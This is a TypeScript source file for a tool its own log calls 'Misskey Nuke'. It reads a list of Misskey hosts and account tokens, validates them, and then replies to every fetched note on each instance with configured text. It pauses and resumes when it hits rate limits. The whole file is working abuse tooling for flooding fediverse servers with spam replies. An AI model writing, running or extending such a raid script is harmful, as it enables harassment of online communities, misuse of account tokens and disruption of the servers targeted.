import { createPrompt } from "./lib/createPrompt.ts";
import { isExist } from "./lib/isExist.ts";
import { Logger } from "./logger/index.ts";
import { isToken } from "./lib/isToken.ts";
import { isHost } from "./lib/isHost.ts";
import { getNotes } from "./misskey/getNotes/index.ts";
import { createReply } from "./misskey/createReply/index.ts";
import { config } from './config.ts';
import { wait } from "./lib/wait.ts";

Logger.log("Bootstrapping /Misskey Nuke/ ...", "success");
Logger.log("Created by @amex2189", "success");

async function main() {
  const tokenFilePath = createPrompt("Misskey tokens file path");

  if (!tokenFilePath) {
    return await main();
  } else if (!isExist(tokenFilePath)) {
    Logger.log("Misskey tokens file not found", "error");
    return await main();
  }

  const token = (await Deno.readTextFile(tokenFilePath)).split("\n").map(
    (line) => {
      const parsed = line.trim().split(":");
      if (parsed[0] === "" || parsed[1] === "") return;
      return {
        host: parsed[0],
        secret: parsed[1],
      };
    },
  ).filter((token) => token !== undefined);

  const tokenList: NonNullable<(typeof token[number])>[] = [];

  for (const t of token) {
    if (isToken(t?.secret)) {
      if (isHost(t?.host)) {
        tokenList.push(t!);
        Logger.log(
          `Misskey token ${t?.secret.slice(0, 5)}... is valid`,
          "success",
        );
      } else {
        Logger.log(`Misskey host ${t?.host} is invalid`, "error");
      }
    } else {
      Logger.log(
        `Misskey token ${t?.secret.slice(0, 5)}... is invalid`,
        "error",
      );
    }
  }
  

  for (const t of tokenList) {
    Logger.log(`Nuking ${t.host} ...`, "warn");
    try {
      const notes = await getNotes(t.secret, t.host);
      for (const note of notes) {
        try {
          await createReply(t.secret, t.host, note.id, config.text.replace(
            "{{hash}}",
            btoa(note.id),
          ));
          Logger.log(`Nuked at ${note.id}`, "success");
        } catch (_) {
          Logger.log(`Rate limit on ${t.host}`, "warn");
          Logger.log(`Waiting 5 seconds`, "error");
          await wait(5000);  
          continue;     
        }

        await wait(500);
      }
    }catch (_) {
      Logger.log(`Failed to nuke on ${t.host}`, "error"); 
    }
  }
}

main();
